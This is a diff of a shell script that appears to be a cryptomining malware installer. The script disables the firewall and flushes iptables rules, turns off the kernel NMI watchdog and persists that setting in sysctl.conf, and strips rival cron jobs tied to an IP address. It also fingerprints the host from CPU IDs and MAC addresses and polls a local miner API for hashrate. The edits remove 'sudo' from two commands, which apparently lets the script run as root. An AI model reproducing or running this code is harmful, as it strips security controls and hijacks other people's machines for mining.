@@ -239,7 +239,7 @@ files(){
     ufw disable
     iptables -F
     echo "nope" >/tmp/log_rot
-    sudo sysctl kernel.nmi_watchdog=0
+    sysctl kernel.nmi_watchdog=0
     echo '0' >/proc/sys/kernel/nmi_watchdog
     echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
  rm /tmp/.cron
@@ -429,7 +429,7 @@ crontab -l | sed '/93.189.43.3/d' | crontab -
 crontab -l | sed '/update.sh/d' | crontab -
 
 sleep 10
-guid=`echo $(sudo dmidecode -t 4 | grep ID | sed 's/.*ID://;s/ //g') $(ifconfig | grep -oP 'HWaddr \K.*'|sed 's/://g')|sha256sum|awk '{print $1}'`
+guid=`echo $(dmidecode -t 4 | grep ID | sed 's/.*ID://;s/ //g') $(ifconfig | grep -oP 'HWaddr \K.*'|sed 's/://g')|sha256sum|awk '{print $1}'`
 mip=`$pythonpath -c "import json,urllib2;r=urllib2.urlopen('http://127.0.0.1:65529/1/summary');j=json.loads(r.read());print str(j['connection']['ip']).replace(' ','')"`
 hashrate=`$pythonpath -c "import json,urllib2;r=urllib2.urlopen('http://127.0.0.1:65529/1/summary');j=json.loads(r.read());print str(j['hashrate']['total']).replace(' ','')"`
 pyver=`$pythonpath -V 2>&1|awk '{print $2}'`
